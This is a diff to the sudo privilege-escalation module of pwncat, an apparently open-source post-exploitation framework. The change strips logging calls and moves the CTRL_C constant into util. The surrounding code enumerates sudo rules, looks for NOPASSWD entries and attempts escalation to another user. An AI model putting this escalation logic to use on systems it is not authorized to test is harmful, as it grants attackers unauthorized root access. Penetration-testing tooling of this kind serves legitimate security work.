@@ -7,12 +7,11 @@ import os
 from colorama import Fore, Style
 from io import StringIO
 
-from pwncat.util import info, success, error, progress, warn, CTRL_C
 from pwncat.privesc.base import Method, PrivescError, Technique
-
 from pwncat.pysudoers import Sudoers
 from pwncat import gtfobins
 from pwncat.privesc import Capability
+from pwncat import util
 
 
 class SudoMethod(Method):
@@ -33,13 +32,8 @@ class SudoMethod(Method):
         output = self.pty.client.recv(6).lower()
 
         if output == b"[sudo]" or output == b"passwo":
-            info("sudo is asking for a password", overlay=True)
-
             if current_user["password"] is None:
-                self.pty.client.send(CTRL_C)  # break out of password prompt
-                error(
-                    f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} has no known password"
-                )
+                self.pty.client.send(util.CTRL_C)  # break out of password prompt
                 raise PrivescError(
                     f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} has no known password"
                 )
@@ -64,7 +58,7 @@ class SudoMethod(Method):
                 or output == b"sorry,"
                 or output == b"sudo: "
             ):
-                self.pty.client.send(CTRL_C)  # break out of password prompt
+                self.pty.client.send(util.CTRL_C)  # break out of password prompt
 
                 # Handle the edge case sudo telling us something
                 if output == b"sorry,":
@@ -112,8 +106,6 @@ class SudoMethod(Method):
     def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
         """ Find all techniques known at this time """
 
-        info(f"checking {Fore.YELLOW}sudo -l{Fore.RESET} output", overlay=True)
-
         sudo_rules = self.find_sudo()
 
         current_user = self.pty.current_user
@@ -145,13 +137,13 @@ class SudoMethod(Method):
                         tag = " ".join(tags_split[1:])
                         command = commands["command"]
 
-                    success(
-                        f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} can run "
-                        + f"{Fore.YELLOW}{command}{Fore.RESET} "
-                        + f"as user {Fore.BLUE}{run_as_user}{Fore.RESET} "
-                        + f"with {Fore.BLUE}{tag}{Fore.RESET}",
-                        overlay=True,
-                    )
+                    # success(
+                    #     f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} can run "
+                    #     + f"{Fore.YELLOW}{command}{Fore.RESET} "
+                    #     + f"as user {Fore.BLUE}{run_as_user}{Fore.RESET} "
+                    #     + f"with {Fore.BLUE}{tag}{Fore.RESET}",
+                    #     overlay=True,
+                    # )
 
                 if "NOPASSWD" in tag:
                     sudo_no_password.append(
@@ -230,10 +222,6 @@ class SudoMethod(Method):
 
         binary, sudo_spec, password_required = technique.ident
 
-        info(
-            f"attempting potential privesc with sudo {Fore.GREEN}{Style.BRIGHT}{binary.path}{Style.RESET_ALL}",
-        )
-
         before_shell_level = self.pty.run("echo $SHLVL").strip()
         before_shell_level = int(before_shell_level) if before_shell_level != b"" else 0
 
@@ -258,16 +246,12 @@ class SudoMethod(Method):
 
         user = self.pty.whoami()
         if user == technique.user:
-            success("privesc succeeded")
             return exit
-
-        error(f"privesc failed (still {user} looking for {technique.user})")
 
         after_shell_level = self.pty.run("echo $SHLVL").strip()
         after_shell_level = int(after_shell_level) if after_shell_level != b"" else 0
 
         if after_shell_level > before_shell_level:
-            info("exiting spawned inner shell")
             self.pty.run(exit, wait=False)  # here be dragons
 
         raise PrivescError("failed to privesc")
